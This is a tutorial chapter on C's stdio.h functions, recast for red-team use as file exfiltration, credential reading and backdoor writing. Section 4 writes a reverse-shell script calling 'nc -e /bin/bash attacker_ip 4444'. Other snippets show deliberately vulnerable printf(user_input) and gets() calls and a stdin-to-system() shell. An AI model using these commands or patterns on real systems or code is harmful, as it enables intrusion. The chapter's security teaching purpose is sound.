# **6. `stdio.h` (Standard Input/Output)**

The **`stdio.h`** header file provides functions for performing **input and output** operations, including reading from and writing to files, **standard input** (keyboard), **standard output** (screen), and **standard error**. Understanding how to use the various functions in `stdio.h` is crucial for tasks like **information gathering**, **exfiltration**, and **payload delivery**.

---

### **Key Functions and Concepts in `stdio.h`**

1. **`fopen()`**

   * **Purpose**: Opens a file and returns a **file pointer** for reading, writing, or appending.
   * **Common Use**: Opening files for **reading** or **writing**. Useful in scenarios like **file-based exfiltration** or **log manipulation**.
   * **Example**:

     ```c
     FILE *file = fopen("/tmp/exploit.log", "w");
     if (file == NULL) {
       perror("Failed to open file");
     }
     ```

2. **`fclose()`**

   * **Purpose**: Closes a file that was opened with `fopen()`.
   * **Common Use**: After reading or writing to a file, `fclose()` ensures that any changes are saved and resources are released.
   * **Example**:

     ```c
     fclose(file);
     ```

3. **`fread()`**

   * **Purpose**: Reads data from a file into a buffer.
   * **Common Use**: Useful for **reading sensitive files**, **file-based exfiltration**, or **finding exploit information** (like passwords, configuration files).
   * **Example**:

     ```c
     char buffer[256];
     size_t bytesRead = fread(buffer, 1, sizeof(buffer), file);
     if (bytesRead == 0) {
       perror("Failed to read file");
     }
     ```

4. **`fwrite()`**

   * **Purpose**: Writes data from a buffer to a file.
   * **Common Use**: Useful for **payload delivery** or **writing logs** (e.g., creating **backdoor** scripts or exfiltrating data).
   * **Example**:

     ```c
     const char *data = "Sensitive information";
     fwrite(data, 1, strlen(data), file);
     ```

5. **`fprintf()`**

   * **Purpose**: Writes formatted output to a file.
   * **Common Use**: Writing structured data (e.g., error logs or status reports) to a file for **post-exploitation** tasks or **data exfiltration**.
   * **Example**:

     ```c
     FILE *file = fopen("/tmp/output.txt", "w");
     if (file) {
         fprintf(file, "Exploit result: %d\n", result);
         fclose(file);
     }
     ```

6. **`fscanf()`**

   * **Purpose**: Reads formatted input from a file.
   * **Common Use**: Extracting sensitive data (e.g., passwords, keys) from files during **information gathering**.
   * **Example**:

     ```c
     char username[50], password[50];
     FILE *file = fopen("/tmp/passwords.txt", "r");
     fscanf(file, "%s %s", username, password);
     printf("Username: %s, Password: %s\n", username, password);
     fclose(file);
     ```

7. **`fflush()`**

   * **Purpose**: Forces the output buffer to be written to a file.
   * **Common Use**: Ensures that any data written to a file or stream is immediately **flushed** to disk. This can be critical for **real-time logging** or **exfiltration** to avoid missing data.
   * **Example**:

     ```c
     fflush(stdout);  // Immediately prints to the terminal
     ```

8. **`getchar()`**

   * **Purpose**: Reads a single character from standard input.
   * **Common Use**: Capturing user input for **interactivity** or **password inputs** during an attack.
   * **Example**:

     ```c
     char ch = getchar();
     printf("You pressed: %c\n", ch);
     ```

9. **`putchar()`**

   * **Purpose**: Writes a single character to standard output.
   * **Common Use**: Useful for **interactive sessions** or **command-line communication** (e.g., during a reverse shell interaction).
   * **Example**:

     ```c
     putchar('A');
     ```

10. **`gets()` / `fgets()`**

    * **Purpose**: Reads a string from the standard input (keyboard) or file.
    * **Common Use**: `gets()` is dangerous because it doesn’t check buffer size, which can lead to **buffer overflows**. `fgets()` is safer because it allows you to specify the buffer size.
    * **Example**:

      ```c
      char buffer[256];
      fgets(buffer, sizeof(buffer), stdin);  // Safer version of gets()
      ```

11. **`scanf()`**

    * **Purpose**: Reads formatted input from standard input.
    * **Common Use**: Used for getting formatted user input, such as **username** or **password**, which may be useful for **information gathering**.
    * **Example**:

      ```c
      int number;
      scanf("%d", &number);
      ```

12. **`perror()`**

    * **Purpose**: Prints a description of the last error to standard error.
    * **Common Use**: Logging error messages or debugging failed operations. Useful for error reporting during attacks or exploit development.
    * **Example**:

      ```c
      if (fopen("nonexistent_file.txt", "r") == NULL) {
          perror("Error opening file");
      }
      ```

---

### **Advanced Use Cases for `stdio.h` in Penetration Testing & Red Teaming**

#### **1. File-based Exfiltration**

**Objective**: Exfiltrate sensitive data from a compromised system by writing data to a file and transferring it elsewhere.

##### **Technique**:

* After gaining access to a system, an attacker can use `stdio.h` functions like `fopen()`, `fwrite()`, and `fclose()` to write exfiltrated data to a file, which can later be transferred to the attacker's server.

```c
FILE *file = fopen("/tmp/sensitive_data.txt", "w");
if (file) {
    fwrite(sensitive_data, 1, strlen(sensitive_data), file);
    fclose(file);
}
```

* **Real-World Use Case**: An attacker might use this to create **backdoor scripts** or extract sensitive information (like **database credentials**) into a file, then upload it via a reverse shell.

---

#### **2. Command Injection through `printf()` or `fprintf()`**

**Objective**: **Exploit format string vulnerabilities** to execute arbitrary commands.

##### **Technique**:

* If a program improperly handles user input (e.g., without validating a string passed to `printf()`), an attacker can **inject format strings** like `%s`, `%x`, or `%n` to leak memory, manipulate variables, or execute arbitrary code.

```c
char user_input[256];
scanf("%s", user_input);
printf(user_input);  // Vulnerable to format string exploit
```

* **Real-World Use Case**: An attacker could inject format specifiers like `%x` or `%n` into a vulnerable program's input, potentially leaking memory addresses or overwriting values in memory.

---

#### **3. Buffer Overflow Using `gets()` or `scanf()`**

**Objective**: **Exploit a buffer overflow** vulnerability to gain control of the program’s execution flow.

##### **Technique**:

* The function `gets()` does not perform bounds checking, making it vulnerable to buffer overflow attacks. This can be used to overwrite memory, including return addresses or function pointers.

```c
char buffer[256];
gets(buffer);  // Vulnerable to buffer overflow
```

* **Real-World Use Case**: An attacker could overflow the buffer with shellcode and control the program's execution, potentially executing **arbitrary commands** or **gaining shell access**.

---

#### **4. Writing Malicious Logs or Backdoor Scripts**

**Objective**: Write malicious data into logs or scripts to gain persistent access.

##### **Technique**:

* By using functions like `fwrite()` or `fprintf()`, an attacker can write malicious **backdoor scripts** into log files or create a **reverse shell** script. These scripts can be executed by a vulnerable service on the target system.

```c
FILE *file = fopen("/tmp/reverse_shell.sh", "w");
if (file) {
    fprintf(file, "#!/bin/bash\n");
    fprintf(file, "nc -e /bin/bash attacker_ip 4444\n");
    fclose(file);
}
```

* **Real-World Use Case**: An attacker writes a reverse shell script to `/tmp/reverse_shell.sh` and waits for the victim to execute it, or it could be executed automatically by a vulnerable service.

---

#### \*\*5. Interactive Shell via \`putchar


()`/`getchar()\`\*\*

**Objective**: Create a basic **interactive shell** through standard I/O functions.

##### **Technique**:

* By using `putchar()` and `getchar()`, an attacker could simulate interactive communication with the compromised system, sending and receiving commands in a **reverse shell** scenario.

```c
putchar('>');  // Display prompt
char cmd[256];
fgets(cmd, sizeof(cmd), stdin);  // Capture command input
system(cmd);  // Execute command
```

* **Real-World Use Case**: An attacker can use this technique to **manually control** the victim system after exploiting a vulnerability and gaining initial access.

---
